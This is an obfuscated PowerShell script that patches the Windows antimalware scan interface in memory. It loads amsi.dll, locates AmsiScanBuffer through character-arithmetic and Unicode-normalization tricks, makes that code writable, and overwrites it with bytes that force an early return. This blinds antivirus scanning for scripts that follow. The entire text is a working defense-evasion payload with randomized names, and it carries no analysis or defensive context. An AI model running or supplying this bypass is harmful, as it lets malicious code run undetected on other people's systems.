$t0HzcDJa4g2 = @"
using System;
using System.Runtime.InteropServices;
public class t0HzcDJa4g2 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr rQLnulJc2bu1fVHV_, string rqVDtX6pGpHvqIq8);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr MyqRoSY6G, UIntPtr nOlDlEKFsVWbXZ, uint vF4lQ5p_8s_ptJuNrPmy, out uint AiHEPUT829);
}
"@

Add-Type $t0HzcDJa4g2

$J8gHAMCDIcONb0HX_rOS = [t0HzcDJa4g2]::LoadLibrary("$([cHar]([byte]0x61)+[CHar]([byte]0x6d)+[CHAr](18+97)+[Char]([BytE]0x69)+[Char](46+44-44)+[CHAr](21+79)+[chAR](108)+[chAR](108*81/81))")
$TAGPHjukz333CL = [t0HzcDJa4g2]::GetProcAddress($J8gHAMCDIcONb0HX_rOS, "$(('ÂmsìSc'+'ãnBùff'+'ér').NORmALIzE([cHAR]([BYTe]0x46)+[ChAr]([byTE]0x6f)+[CHAR]([bytE]0x72)+[char](109*105/105)+[cHAR](68*4/4)) -replace [chAr]([bYtE]0x5c)+[chAr](112)+[chAr](123+79-79)+[char](77+32-32)+[cHar](110+61-61)+[cHaR]([Byte]0x7d))")
$p = 0
[t0HzcDJa4g2]::VirtualProtect($TAGPHjukz333CL, [uint32]5, 0x40, [ref]$p)
$RtVmTNULt = "0xB8"
$OKBN97IycgXr_u40 = "0x57"
$vDaPWsTEvv00FS6 = "0x00"
$OSU1R37xN3vVgtOKjNAW = "0x07"
$BYQ4uTQvenV = "0x80"
$pagfWqA1FN = "0xC3"
$d3ZYmlTKgI = [Byte[]] ($RtVmTNULt,$OKBN97IycgXr_u40,$vDaPWsTEvv00FS6,$OSU1R37xN3vVgtOKjNAW,+$BYQ4uTQvenV,+$pagfWqA1FN)
[System.Runtime.InteropServices.Marshal]::Copy($d3ZYmlTKgI, 0, $TAGPHjukz333CL, 6)